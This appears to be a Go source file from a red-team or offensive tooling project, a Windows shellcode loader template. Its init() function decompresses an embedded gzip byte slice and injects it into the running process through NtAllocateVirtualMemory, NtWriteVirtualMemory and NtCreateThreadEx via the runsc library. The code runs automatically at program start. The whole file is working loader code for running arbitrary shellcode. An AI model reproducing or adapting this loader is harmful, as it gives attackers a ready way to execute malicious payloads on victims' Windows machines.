//go:build windows

package main

import (
	"bytes"
	"compress/gzip"
	"io"

	"github.com/mjwhitta/runsc"
)

func init() {
	var e error
	var g *gzip.Reader
	var l *runsc.Launcher

	// Return if no shellcode
	if len(sc) == 0 {
		return
	}

	// Uncompress
	if g, e = gzip.NewReader(bytes.NewReader(sc)); e != nil {
		return
	}
	defer func() {
		if e = g.Close(); e != nil {
			panic(e)
		}
	}()

	if sc, e = io.ReadAll(g); e != nil {
		return
	}

	// Launch shellcode into current process using
	// NtAllocateVirtualMemory, NtWriteVirtualMemory, and
	// NtCreateThreadEx. See github.com/mjwhitta/runsc for other
	// configuration methods.
	l = runsc.New()
	l.AllocVia(runsc.NtAllocateVirtualMemory)
	l.WriteVia(runsc.NtWriteVirtualMemory)
	l.RunVia(runsc.NtCreateThreadEx)

	if e = l.Exe(sc); e != nil {
		return
	}
}
